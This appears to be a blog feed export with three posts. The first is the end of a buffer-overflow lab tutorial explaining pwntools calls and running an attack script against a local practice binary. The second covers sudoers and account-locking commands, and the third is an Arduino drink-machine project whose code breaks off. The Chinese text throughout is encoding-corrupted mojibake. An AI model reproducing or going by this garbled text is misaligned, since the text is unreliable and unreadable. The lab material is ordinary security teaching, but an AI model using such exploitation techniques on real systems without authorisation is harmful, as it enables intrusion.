å‡½å¼é€²å…¥äº’å‹•æ¨¡å¼ï¼Œä»¥ä¾¿è§€å¯Ÿæ”»æ“Šçš„çµæœã€‚</p><ul><li><p><code>recvuntil()</code>ï¼šreceive untilï¼Œå¯æ¥æ”¶ç‰¹å®šå­—ä¸²ï¼Œç•¶åˆ°é”ç›®æ¨™å­—ä¸²æ™‚ï¼ŒåŸ·è¡ŒxxæŒ‡ä»¤</p></li><li><p><code>p8()</code>ã€<code>p32()</code>ã€<code>p64()</code></p><p> <img src="https://i.imgur.com/HZzm1tq.png"></p><ul><li><code>p32</code>ï¼šå°data æ‰“åŒ… (32bit  integer)  &#x2F;&#x2F;u32ï¼šè§£åŒ…</li><li><code>p64</code>ï¼šå° data æ‰“åŒ… (64bit integer)  &#x2F;&#x2F;u64 :è§£åŒ…<br>è½‰æˆä½å€</li></ul></li><li><p><code>sendline(payload)</code>ï¼šç™¼é€payloadï¼Œä¸¦æ›è¡Œ</p></li><li><p><code>interactive()</code>ï¼šé€²å…¥äº¤äº’æ¨¡å¼ï¼Œå¯ç”¨ä¾†åŸ·è¡Œæœ¬åœ°æˆ–é ç«¯åŸ·è¡Œæª”</p></li></ul><h2 id="ä¸ƒã€-åŸ·è¡Œæ”»æ“Šè…³æœ¬"><a href="#ä¸ƒã€-åŸ·è¡Œæ”»æ“Šè…³æœ¬" class="headerlink" title="ä¸ƒã€ åŸ·è¡Œæ”»æ“Šè…³æœ¬"></a>ä¸ƒã€ åŸ·è¡Œæ”»æ“Šè…³æœ¬</h2><p>æœ€å¾Œï¼Œæˆ‘å€‘åŸ·è¡Œæ”»æ“Šè…³æœ¬ä»¥é€²è¡Œæ”»æ“Šï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 attack.py</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Hr1LHfQ.png"></p><p>æ”»æ“ŠæˆåŠŸå¾Œï¼Œç¨‹å¼å°‡æœƒåŸ·è¡Œ <code>target</code> å‡½å¼ï¼Œä¸¦é¡¯ç¤º â€œOh No! Your Hacker.â€ çš„è¨Šæ¯ï¼Œè­‰æ˜æˆ‘å€‘æˆåŠŸåœ°åˆ©ç”¨ç·©è¡å€æº¢ä½æ¼æ´é€²è¡Œäº†æ”»æ“Šã€‚</p><div class="note success flat"><p>æˆåŠŸåŸ·è¡Œtargetå‡½å¼!</p></div><div class="note warning flat"><p>è«‹è¨˜å¾—åœ¨å¯¦éš›ç’°å¢ƒä¸­æ‡‰ç”¨æ‰€å­¸çš„çŸ¥è­˜æ™‚ï¼Œç¢ºä¿éµå®ˆç›¸é—œæ³•å¾‹æ³•è¦ï¼Œä¸¦åƒ…åœ¨åˆæ³•æˆæ¬Šçš„æƒ…æ³ä¸‹é€²è¡Œå®‰å…¨æ¸¬è©¦èˆ‡æ¼æ´åˆ©ç”¨ã€‚</p></div><h2 id="åƒè€ƒè³‡æ–™"><a href="#åƒè€ƒè³‡æ–™" class="headerlink" title="åƒè€ƒè³‡æ–™"></a>åƒè€ƒè³‡æ–™</h2><p><a href="https://mks.tw/2976/%e8%b3%87%e8%a8%8a%e5%ae%89%e5%85%a8-%e5%be%9e%e6%af%ab%e7%84%a1%e5%9f%ba%e7%a4%8e%e9%96%8b%e5%a7%8b-pwn-buffer-overflow">https://mks.tw/2976/%e8%b3%87%e8%a8%8a%e5%ae%89%e5%85%a8-%e5%be%9e%e6%af%ab%e7%84%a1%e5%9f%ba%e7%a4%8e%e9%96%8b%e5%a7%8b-pwn-buffer-overflow</a></p>]]></content>
      
      
      <categories>
          
          <category> å¯¦ä½œç´€éŒ„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Security </tag>
            
            <tag> Linux </tag>
            
            <tag> Buffer Overflow </tag>
            
            <tag> exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå‡Linuxç³»çµ±ç®¡ç†æŠ€èƒ½ï¼šæŒæ¡SUDOæ¬Šé™é…ç½®å’Œå¸³æˆ¶è¨­å®š</title>
      <link href="/posts/555098e9.html"/>
      <url>/posts/555098e9.html</url>
      
        <content type="html"><![CDATA[<p>ç•¶æˆ‘å€‘åœ¨Linuxç³»çµ±ä¸­é‹è¡Œä¸€èˆ¬ä½¿ç”¨è€…å¸³æˆ¶æ™‚ï¼Œæœ‰æ™‚æœƒéœ€è¦åŸ·è¡Œéœ€è¦è¶…ç´šç”¨æˆ¶æ¬Šé™çš„æŒ‡ä»¤ï¼Œä¾‹å¦‚æ›´æ–°è»Ÿé«”åŒ…æˆ–ä¸‹è¼‰æª”æ¡ˆç­‰ã€‚ç„¶è€Œï¼Œå¦‚æœä¸€èˆ¬ä½¿ç”¨è€…æ²’æœ‰è¢«æˆäºˆsudoæ¬Šé™ï¼Œå°±ç„¡æ³•åŸ·è¡Œé€™äº›æŒ‡ä»¤ã€‚<strong>ç‚ºäº†è®“ä¸€èˆ¬ä½¿ç”¨è€…èƒ½å¤ ä½¿ç”¨sudoæŒ‡ä»¤ï¼Œæˆ‘å€‘éœ€è¦é€²è¡Œsudoersè¨­å®š</strong>ã€‚</p><p>é€™è£¡å°‡ä»‹ç´¹å¦‚ä½•é…ç½®sudoæ¬Šé™ä»¥åŠå…¶ä»–æœ‰è¶£çš„å¸³æˆ¶å­˜å–ç›¸é—œçš„è¨­å®šã€‚</p><h1 id="sudoersè¨­å®šæª”"><a href="#sudoersè¨­å®šæª”" class="headerlink" title="sudoersè¨­å®šæª”"></a>sudoersè¨­å®šæª”</h1><p>åœ¨Linuxç³»çµ±ä¸­ï¼Œå¯ä»¥ä½¿ç”¨sudoersè¨­å®šæª”ä¾†æŒ‡å®šä½¿ç”¨è€…ã€ç¾¤çµ„æˆ–åˆ¥åçš„sudoæ¬Šé™ã€‚è©²è¨­å®šæª”é€šå¸¸ä½æ–¼<code>/etc/sudoers</code>ã€‚</p><p><img src="https://i.imgur.com/EcE7ix5.png"></p><p>ç„¶è€Œï¼Œç‚ºäº†é¿å…å°sudoersè¨­å®šæª”é€²è¡ŒéŒ¯èª¤çš„æ›´æ”¹ï¼Œæˆ‘å€‘æ‡‰è©²ä½¿ç”¨ <code>visudo</code> æŒ‡ä»¤ä¾†ç·¨è¼¯è¨­å®šæª”ã€‚</p><p><code>visudo</code> åœ¨ä¿å­˜è¨­å®šæ™‚æœƒæª¢æŸ¥æ˜¯å¦å­˜åœ¨éŒ¯èª¤çš„é…ç½®ï¼Œä¾‹å¦‚éŒ¯èª¤çš„æ¬Šé™æˆ–èªæ³•å•é¡Œã€‚è«‹æ³¨æ„ï¼Œsudoersè¨­å®šæª”åªèƒ½ä½¿ç”¨ <code>visudo</code> æŒ‡ä»¤ä¾†ç·¨è¼¯ï¼Œå¦‚æœç›´æ¥ä½¿ç”¨vimç­‰ç·¨è¼¯å™¨ï¼Œå¯èƒ½æœƒé‡åˆ°å”¯è®€æˆ–ç„¡æ³•è¦†å¯«çš„å•é¡Œï¼Œæœƒè·³å‡º <strong>read-onlyï¼Œcannot override.</strong></p><p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¾†æ‰“é–‹sudoersè¨­å®šæª”é€²è¡Œç·¨è¼¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo visudo</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/rqL2ZNl.png"></p><p>ä¸€æ—¦æ‰“é–‹äº†è¨­å®šæª”ï¼Œå¯ä»¥åœ¨rootè¡Œä¸‹æ–¹æ·»åŠ æ–°çš„é…ç½®ï¼ŒæŒ‡å®šè¦æˆäºˆå“ªå€‹ä½¿ç”¨è€…æˆ–ç¾¤çµ„ä»€éº¼æ¨£çš„æ¬Šé™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root  ALL=(ALL:ALL) ALL</span><br><span class="line">[user å¸³è™Ÿ] [userçš„ä¾†æºä¸»æ©Ÿ]=([å¯åˆ‡æ›çš„èº«ä»½])[å¯åŸ·è¡Œçš„æŒ‡ä»¤]</span><br></pre></td></tr></table></figure><h1 id="å…¶ä»–æœ‰è¶£çš„å¸³æˆ¶å­˜å–è¨­å®š"><a href="#å…¶ä»–æœ‰è¶£çš„å¸³æˆ¶å­˜å–è¨­å®š" class="headerlink" title="å…¶ä»–æœ‰è¶£çš„å¸³æˆ¶å­˜å–è¨­å®š"></a>å…¶ä»–æœ‰è¶£çš„å¸³æˆ¶å­˜å–è¨­å®š</h1><h3 id="passwd-åƒæ•¸-l"><a href="#passwd-åƒæ•¸-l" class="headerlink" title="passwd åƒæ•¸ -l"></a>passwd åƒæ•¸ -l</h3><p><img src="https://i.imgur.com/NUH03vf.png"></p><p><code>passwd</code>  å‘½ä»¤çš„-låƒæ•¸ç”¨æ–¼é–å®šå¸³æˆ¶å¯†ç¢¼ã€‚<strong>ç•¶æˆ‘å€‘é–å®šå¸³æˆ¶å¯†ç¢¼æ™‚ï¼Œç³»çµ±æœƒå°‡å¯†ç¢¼çš„é›œæ¹Šå€¼(æ”¾åœ¨ &#x2F;etc&#x2F;shadow )æ›´æ”¹ç‚ºç³»çµ±ä¸­å°šæœªä½¿ç”¨çš„å€¼ã€‚</strong> é–å®šçš„å¯†ç¢¼åœ¨ <code>/etc/passwd</code> æª”æ¡ˆä¸­çš„å¯†ç¢¼é›œæ¹Šå€¼å‰é¢é¡¯ç¤ºä¸€å€‹é©šå˜†è™Ÿ(!)ã€‚å› æ­¤ï¼Œç•¶æˆ‘å€‘ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤é–å®šå¸³æˆ¶å¯†ç¢¼æ™‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd -l</span><br></pre></td></tr></table></figure><p>å…¶ä»–ä½¿ç”¨è€…ä½¿ç”¨sudo suç­‰æŒ‡ä»¤æ™‚ï¼Œå°‡ç„¡æ³•åˆ‡æ›ç‚ºrootç”¨æˆ¶ã€‚<br>æ­¤å¤–ï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨chshå‘½ä»¤ä¾†æ›´æ”¹å¸³æˆ¶çš„shellã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chsh root</span><br><span class="line">chsh [user/root]</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/DHCIuI0.png"></p><p>ä¸Šé¢çš„æˆªåœ–é¡¯ç¤ºäº†passwdå‘½ä»¤çš„è¼¸å‡ºï¼Œå…¶ä¸­rootç”¨æˆ¶çš„é è¨­shellæ˜¯ <code>/bin/bash</code>ã€‚<br>å¦å¤–ï¼Œè€Œå¯ä»¥è§€å¯Ÿåˆ°å…¶ä»–å¾ˆå¤šéƒ½æ˜¯ <code>/usr/sbin/nologin</code>ï¼Œé€™è¡¨ç¤ºåœ¨æœ¬åœ°æˆ–é ç«¯éƒ½ç„¡æ³•ä½¿ç”¨é€™å€‹å¸³æˆ¶ç™»éŒ„ã€‚å› æ­¤ï¼Œå¦‚æœå°‡rootçš„shellæ›´æ”¹ç‚º <code>/usr/sbin/nologin</code>ï¼Œå‰‡æ²’æœ‰äººå¯ä»¥è¨ªå•rootå¸³æˆ¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chsh root</span><br><span class="line">/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šæ˜¯æœ‰é—œé…ç½®sudoæ¬Šé™å’Œæ›´æ”¹å¸³æˆ¶shellçš„ä¸€äº›æŠ€å·§ã€‚<br>é€éé€™äº›è¨­å®šï¼Œæˆ‘å€‘å¯ä»¥æ›´å¥½åœ°ç®¡ç†Linuxç³»çµ±ä¸Šçš„ä½¿ç”¨è€…æ¬Šé™å’Œå®‰å…¨æ€§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å­¸ç¿’ç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019é€šè¨Šç³»ç•¢æ¥­å°ˆé¡Œ</title>
      <link href="/posts/4b76a41f.html"/>
      <url>/posts/4b76a41f.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgur.com/O3Xs5VC.jpg"></p><h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>è€å¯¦èªªä¸€é–‹å§‹é¸æ“‡æ•™æˆæ™‚ï¼Œä¸¦æ²’æœ‰æƒ³å¤ªå¤šï¼Œåªæƒ³æ‰¾æ¶¼çš„æ•™æˆï¼Œæˆ‘è¨˜å¾—ç•¶æ™‚çš„è€ƒé‡æ˜¯ ã€Œå°æˆ‘å€‘å­¸æ ¡ä¾†èªªé‚„æ˜¯è€ƒç ”è¶•å¿«æ›å­¸æ ¡é‡è¦ã€å› æ­¤æ²’æœ‰æŒ‘æˆ°ç¡¬ä¸€é»çš„ä¸»é¡Œ&#x2F;æ•™æˆ XDã€‚æ‰€ä»¥æœ€å¾Œæˆ‘æ‰¾äº†å…¨ç³»æœ€æ¶¼çš„æ•™æˆï¼Œå°ˆé¡Œä¸»é¡Œæ¯å¹´éƒ½åªå®šArduino(åŸå› æ‡‰è©²æ˜¯çœéŒ¢åˆçœæ™‚ï¼Œä¹Ÿä¸å¤ªéœ€è¦æ•™)ï¼Œ6å€‹å°ˆé¡Œç”Ÿåˆ†æˆ3çµ„ï¼Œæ¯çµ„2äººã€‚</p><p><strong>ã€ŒArduino + APP é ç«¯é™æ§ã€</strong>ï¼Œå…¶ä»–ä¸»é¡ŒåŒ…è£è‡ªå·±æƒ³ã€‚<br>æ—¢ç„¶æŠ€è¡“ç°¡å–®ã€æ¶æ§‹æ¸…æ¥šï¼Œçœ‹ä¾†è¦æ¯”çš„æ˜¯å‰µæ„å’Œæƒ³æ³•äº†~~~ã€‚åœ¨æŸä¸€å¤©çš„åˆå¾Œï¼Œæˆ‘å’Œçµ„å“¡è¦å»è²·é£²æ–™ï¼Œçªç„¶éˆæ©Ÿä¸€å‹•ï¼Œè¦æ˜¯å¸‚é¢ä¸Šæ‰‹æ–æ¯å’Œé£²æ–™éƒ½èƒ½è‡ªå‹•èª¿é…å’Œç„¡ç·šæ“æ§ï¼Œæ‡‰è©²è »ä¸éŒ¯çš„å–”ï¼ï¼ï¼<br>å› æ­¤æˆ‘å€‘çš„å°ˆé¡Œ ã€ŒSmart Drinks æ™ºæ…§é£²æ–™æ©Ÿã€èª•ç”Ÿäº†ã€‚</p><h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>æˆ‘å€‘å°‡æƒ³é”æˆçš„ç›®æ¨™ç°¡å–®åˆ†æˆå¹¾å€‹ partï¼Œä¾†ä¸€ä¸€è§£æ±º<br>APP + Wifié€£æ¥ + ç§»å‹•é£²æ–™çš„æ–¹æ³• + é£²æ–™æ©Ÿèº«<br>ç”±æ–¼ç§»å‹•ã€èª¿é…é£²æ–™çš„æ–¹æ³•æ˜¯é—œéµï¼Œæœƒå½±éŸ¿åˆ°æ•´é¡Œæ©Ÿèº«è¨­è¨ˆ<br>æ‰€ä»¥æˆ‘å€‘å…ˆè¨­è¨ˆèª¿é£²æ–™æ–¹æ³•(æ€éº¼åšï¼Œæ€éº¼è¨­è¨ˆ)ã€‚</p><h3 id="å–æ–™ã€èª¿é…æ–¹æ³•"><a href="#å–æ–™ã€èª¿é…æ–¹æ³•" class="headerlink" title="å–æ–™ã€èª¿é…æ–¹æ³•:"></a>å–æ–™ã€èª¿é…æ–¹æ³•:</h3><p>æˆ‘å€‘æ‰“ç®—é€éä¸€å€‹å®¹å™¨ä¾†è£è¼‰é£²æ–™åŸæ–™ï¼Œè®“å®¹å™¨åº•éƒ¨é–‹å­”ï¼Œè€Œåº•éƒ¨ä¹‹ä¸‹é»ä¸€å€‹ç´™æ¿ï¼Œç´™æ¿ä¹Ÿé–‹å­”ï¼Œä½†å®¹å™¨å­”å’Œç´™æ¿å­”å…ˆä¸å°é½Šï¼Œç”±servo motorä¾†æ§åˆ¶æ—‹è½‰è§’åº¦ï¼Œé€²è€Œä½¿ç´™æ¿å­”å’Œå®¹å™¨å­”å°é½Šï¼Œå…§å®¹ç‰©å‰‡æœƒè‡ªç„¶è½ä¸‹ã€‚</p><p><img src="https://i.imgur.com/BdtsD1G.jpg"></p><p>æ‰€ä»¥é€™ç¨®å–æ–™æ–¹å¼ï¼Œå®¹å™¨å¿…é ˆæœ‰ä¸€å®šé«˜åº¦ï¼Œå› æ­¤æ©Ÿèº«è¨­è¨ˆå¿…é ˆè€ƒæ…®é€™é»ã€‚é‚£å¯æƒ³è€ŒçŸ¥ï¼Œé£²æ–™æ¯å¿…é ˆåœ¨åº•éƒ¨ç§»å‹•ï¼Œé€²è¡Œå–æ–™ï¼Œæœ€å¾Œé‚„è¦åŠ æ°´ã€‚</p><h3 id="ç§»å‹•æ–¹å¼ï¼š"><a href="#ç§»å‹•æ–¹å¼ï¼š" class="headerlink" title="ç§»å‹•æ–¹å¼ï¼š"></a>ç§»å‹•æ–¹å¼ï¼š</h3><p>è¨­è¨ˆ Xã€Yè»¸æ»‘å°(é¡ä¼¼å¤¾å¨ƒå¨ƒæ©Ÿä¸Šæ–¹çš„ç§»å‹•æ©«æ¡¿)ï¼Œä¾†è®“é£²æ–™æ¯é€²è¡Œå‰å¾Œï¼Œå·¦å³çš„ç§»å‹•ã€‚<br>åœ¨å¤§è‡´è¦åŠƒå¥½è¦æ€éº¼å–æ–™ç§»å‹•å¾Œï¼Œè‘—æ‰‹é€²è¡Œæ©Ÿèº«çš„è¨­è¨ˆ</p><h3 id="æ©Ÿèº«è¨­è¨ˆï¼š"><a href="#æ©Ÿèº«è¨­è¨ˆï¼š" class="headerlink" title="æ©Ÿèº«è¨­è¨ˆï¼š"></a>æ©Ÿèº«è¨­è¨ˆï¼š</h3><p>é€éä¾¿å®œåˆç’°ä¿çš„æ¾æœ¨å±¤æ¿ä¾†é€²è¡Œè£åˆ‡å’Œçµ„è£</p><p><img src="https://i.imgur.com/7CoF2dM.jpg"></p><p>ç”±æ–¼æ²’æœ‰éæœ¨å·¥ç¶“é©—ï¼Œè€—è²»è¨±ä¹…æ™‚é–“åœ¨æœ¨å·¥ä¸Š(æœ¨å·¥å·²åŠ å…¥å·¥å…·äººskill setå…§)XDã€‚ æ¥è‘—å¯¦ä½œä¸Šæ–¹çš„å–æ–™ç½å’Œä¼ºæœé¦¬é”ï¼š</p><ul><li>å–æ–™ç½ï¼šéš¨ä¾¿ä¸€å€‹ç½å­(æœ‰è“‹)ï¼Œå°‡åº•éƒ¨é–‹æ´ï¼Œç´…è‰²è“‹å­è™•ä¹Ÿé–‹æ´(æ´å£å¯è‡ªè¡Œè¨­è¨ˆå½¢ç‹€)</li></ul><p><img src="https://i.imgur.com/gWqliC7.jpg"></p><p>æ¥è‘—å°‡ç´™æ¿æˆ–çç æ¿é–‹ç•¥å¤§æ–¼ç´…è‰²è“‹å­å­”çš„æ‰‡å½¢æ´ï¼Œä¸¦é€éå°èºçµ²ç©¿éç´™æ¿å’Œå®¹å™¨æ¿(ä»¥æ–¹ä¾¿è½‰å‹•)</p><ul><li>ä¼ºæœé¦¬é”: å›ºå®šæ–¼ä¸Šå±¤å±¤ç‰ˆå´é¢ï¼Œä¸¦èˆ‡ç´™æ¿ç›¸é»</li></ul><p><img src="https://i.imgur.com/Xze3y4W.jpg"></p><p>ç‚ºäº†é˜²æ­¢servo motorè½‰å‹•æ™‚å®¹å™¨è·Ÿè‘—è½‰å‹•ï¼Œç”¨ç†±æº¶è† å›ºå®šéµçµ²å’Œå–æ–™ç½åœ¨å±¤æ¿ä¸Š</p><p><img src="https://i.imgur.com/RGGwRKY.jpg"></p><p>é€™æ¨£å–æ–™ç½æ¶æ§‹åŸºæœ¬ä¸Šå°±å®Œæˆäº†ï¼Œæ¥è‘—å°±é‡è¤‡3æ¬¡ï¼Œå› ç‚ºæˆ‘å€‘è¨­äº†3å€‹å–æ–™ç½<br>é–‹å§‹å¯¦ä½œæœ€éº»ç…©çš„Xã€Yè»¸æ»‘å°ï¼š<br>ææ–™ï¼šæ­¥é€²é¦¬é” x 2ã€èºæ—‹è»¸ x 2(æˆ–ç›´æ¥å»ç¶²è³¼ çµ²è»¸)ã€è»¸æ‰¿åº§ x 4ã€æŸå¸¶ã€åŸ¹æ— x2ã€éµæ¡¿ x 2<br>è£å¥½åˆé©çš„æœ¨é ­ä¸¦é‘½å­”æ”¾å…¥éµæ¡¿å’Œ èºæ—‹è»¸+ æ­¥é€²é¦¬é”(*æ”¾å…¥èºæ—‹è»¸å‰é ˆæ”¾å…¥åŸ¹æ—ï¼Œé¿å…èºæ—‹è»¸è½‰å‹•æ™‚å°‡æœ¨æ¿è½‰å‡ºä¾†)ï¼Œæœ€å¾Œæ”¾å…¥è»¸æ‰¿åº§ä¾†ä¹˜è¼‰Xè»¸ï¼Œxè»¸åšæ³•åŒä¸Šã€‚</p><iframe width="820" height="500" src="https://www.youtube.com/embed/atkGcfnsK3A" title="How to Make Homework Writing Machine at home" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><p>æˆ‘å€‘ç¢°åˆ°æœ€å¤§çš„å•é¡Œæ˜¯ï¼šXè»¸å¤ªé‡ï¼Œé›£ä»¥æ”¯æ’ï¼Œå› æ­¤æ•´å€‹è»¸æ‰¿åº§æœƒå¡ä½ï¼Œå—ä»¥è½‰å‹•ï¼Œå¾Œè‡¨æ™‚é€éå°å‹ç©å…·è»Šä¾†æ”¯æ’è§£æ±ºé€™å€‹å•é¡Œ</p><p><img src="https://i.imgur.com/gPWebQS.jpg"></p><blockquote><p>é€™æ¨£é£²æ–™æ©Ÿèº«éƒ¨åˆ†ä¹Ÿå®Œæˆäº†ï¼ï¼</p></blockquote><h3 id="ç¡¬é«”æ¥ç·šéƒ¨åˆ†ï¼š"><a href="#ç¡¬é«”æ¥ç·šéƒ¨åˆ†ï¼š" class="headerlink" title="ç¡¬é«”æ¥ç·šéƒ¨åˆ†ï¼š"></a>ç¡¬é«”æ¥ç·šéƒ¨åˆ†ï¼š</h3><p><img src="https://i.imgur.com/KmXl0AO.png"></p><p>æ‰€ç”¨å…ƒä»¶ï¼š </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- NodeMCU</span><br><span class="line">- Arduino Megaæ¿</span><br><span class="line">- L298N x 2</span><br><span class="line">- 4-channel relay</span><br><span class="line">- 1-channel relay</span><br><span class="line">- servo x4</span><br><span class="line">- stepper motor x2</span><br><span class="line">- æ²‰æ°´é¦¬é” x2</span><br><span class="line">- power supply(å¯æ”¹ç”¨å¤šå€‹é›»æ± ç›’)</span><br></pre></td></tr></table></figure><p>æƒ³æ³•ï¼šé€éNodMCUæ¥æ”¶æŒ‡ä»¤ä¾†æ“æ§4å€‹ç¹¼é›»å™¨é–‹é—œï¼Œæ¯å€‹ç¹¼é›»å™¨åˆåˆ†åˆ¥æ¥åˆ°Arduinoæ¿é›»æºï¼Œæ¯å€‹Arduinoæ¿å°æ‡‰ä¸€ç¨®é£²æ–™ï¼Œé å…ˆç‡’å¥½çš„codeåœ¨Arduinoå…§ï¼Œé›»æºé–‹å•Ÿæ™‚å‰‡æœƒè‡ªå‹•åŸ·è¡Œå–æ–™å’Œé£²æ–™èª¿é…ç¨‹å¼ã€‚</p><p>ps. ä¸Šåœ–æœ‰åªæœ‰å¯¦ä½œä¸€å€‹Arduinoæ¿<br>ps.æ¯å€‹Arduinoæ¿å¿…é ˆåœ¨é€£åˆ°ä¸€å€‹æ§åˆ¶æ²‰æ°´é¦¬é”çš„ç¹¼é›»å™¨ä¸Š</p><p><img src="https://i.imgur.com/u38OXhA.jpg"></p><p>æ°´ç®¡çš„ä½ç½®æœƒæ˜¯é£²æ–™æ”¾ç½®çš„èµ·å§‹é»å’Œçµ‚é»(å–åŸæ–™å›åŸä½åŠ æ°´)</p><p><img src="https://i.imgur.com/hJ1RbRy.jpg"></p><p>NodeMCU æ¥ç·š:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 4è·¯ç¹¼é›»å™¨</span><br><span class="line">- åˆ†åˆ¥æ¥åˆ°4å€‹Arduinoé›»æºå­”</span><br><span class="line">- 4å€‹Arduino æ¿åˆ†åˆ¥å°‡L298N æ§åˆ¶æ¥è…³æ¥å‡ºä¾†ï¼Œåˆ†åˆ¥æ§åˆ¶æ»‘å°XYè»¸</span><br><span class="line">- 4å€‹Arduino å…¶ä»–pin è…³æ¥å‡ºä¾†æ§åˆ¶4å€‹ servo motor</span><br><span class="line">- 4å€‹Arduino æŸpinè…³å‡ºä¾† æ¥å‡ºä¾†åˆ°æ²‰æ°´é¦¬é”è¨Šè™Ÿç·šã€‚</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„é›»å£“åˆ†é…</p></blockquote><p>Arduinoç¨‹å¼éƒ¨åˆ†:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Arduinoç¨‹å¼éƒ¨åˆ†ï¼š</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Stepper.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Servo.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STEPS 200 <span class="comment">//å®šç¾©æ­¥é€²é¦¬é”æ¯åœˆçš„æ­¥æ•¸</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WATER 24 <span class="comment">//æŠ½æ°´é¦¬é”è…³ä½</span></span></span><br><span class="line"><span class="comment">//steps:ä»£è¡¨é¦¬é”è½‰å®Œä¸€åœˆéœ€è¦å¤šå°‘æ­¥æ•¸ã€‚å¦‚æœé¦¬é”ä¸Šæœ‰æ¨™ç¤ºæ¯æ­¥çš„åº¦æ•¸ï¼Œ</span></span><br><span class="line"><span class="comment">//å°‡360é™¤ä»¥é€™å€‹è§’åº¦ï¼Œå°±å¯ä»¥å¾—åˆ°æ‰€éœ€è¦çš„æ­¥æ•¸(ä¾‹å¦‚ï¼š360/3.6=100)ã€‚</span></span><br><span class="line">Stepper <span class="title function_">Y</span><span class="params">(STEPS, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>)</span>;</span><br><span class="line">Stepper <span class="title function_">X</span><span class="params">(STEPS, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>)</span>;</span><br><span class="line">Servo goal;</span><br><span class="line"><span class="type">int</span> pos;</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Â goal.attach(<span class="number">12</span>);</span><br><span class="line">Â goal.write(<span class="number">0</span>);</span><br><span class="line">Â X.setSpeed(<span class="number">160</span>); <span class="comment">// å°‡é¦¬é”çš„é€Ÿåº¦è¨­å®šæˆ140RPM æœ€å¤§ 150~160</span></span><br><span class="line">Â Y.setSpeed(<span class="number">160</span>); <span class="comment">// é›»å£“7.5V</span></span><br><span class="line">Â pinMode(WATER,OUTPUT);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Â </span><br><span class="line">Â <span class="comment">// Y.step(17000);//+å‘å…§â€Š-â€Šå‘å¤– //å¯å¯:17000 //å¥¶èŒ¶: 17000 //èŒ¶:ç„¡</span></span><br><span class="line">Â delay(<span class="number">500</span>);</span><br><span class="line">Â X.step(<span class="number">-24000</span>);<span class="comment">//å‘å…§ //å¯å¯:-7500 //å¥¶èŒ¶:-20000 //èŒ¶: -20000</span></span><br><span 